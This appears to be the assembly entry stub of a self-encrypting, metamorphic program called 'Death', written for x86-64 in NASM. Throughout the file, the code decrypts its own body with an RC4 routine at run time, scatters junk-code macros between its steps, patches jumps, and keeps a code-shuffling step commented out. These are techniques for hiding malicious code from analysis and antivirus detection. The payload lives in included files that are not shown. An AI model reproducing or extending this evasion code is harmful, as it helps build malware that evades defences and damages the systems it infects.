%include "Death.inc"

BITS 64
default rel

section .text
	global _start

; %rdi %rsi %rdx %r10 %r8 %r9

_start:
	jmp		skip_blabla
	%include "rc4.s"
	skip_blabla:

	sub		rsp, 64
	mov		rbp, rsp

	JUNK_5


	lea		rax, [rel Death]
	mov		[rsp + 32], rax

	lea		rax, [rel printf]
	mov		[rsp + 40], rax

	JUNK_5


	lea	rax, [rel start_shuffle]
	mov		[rsp + 48], rax
	lea	rax, [rel end_shuffle]
	mov		[rsp + 56], rax

	lea		rax, [rel rc4]
	mov		[rsp], rax

	lea		rax, [rel _start]
	mov		[rsp + 8], rax
	JUNK_5


	lea		rax, [rel _stop]
	mov		[rsp + 16], rax

	lea		rcx, [rel _encrypted_start]
	mov		[rsp + 24], rcx

	sub		rax, rcx
	mov		rsi, rax
	mov		rdi, rcx
	xor		rdx, rdx
	call	[rbp]



	;lea	rdi, [rel start_shuffle]
	;lea	rsi, [rel end_shuffle]

	;call	shuffle

	lea	rdi, [rel encrypted_start]
	lea	rsi, [rel _stop]

	JUNK_5


	call	patchjmp

	JUNK_5





%include "encrypt_start.s"


%include "end.s"




%include "video.s"

; Functions to remove!
%include "print_rax.s"
%include "printf.s"
%include "Deathf.s"
; Functions to remove!

_stop:

%include "data.s"
